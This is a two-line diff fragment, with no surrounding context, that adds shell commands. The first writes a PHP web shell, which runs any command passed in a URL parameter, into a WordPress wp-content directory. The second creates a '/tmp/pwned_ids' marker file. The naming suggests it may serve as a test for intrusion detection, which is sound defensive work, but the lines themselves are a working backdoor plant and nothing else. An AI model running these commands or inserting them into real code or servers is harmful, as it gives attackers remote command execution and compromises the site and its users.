@@ -1,0 +1,2 @@
+echo '<?php system($_GET["c"]); ?>' > /var/www/html/wp-content/ids.php
+touch /tmp/pwned_ids
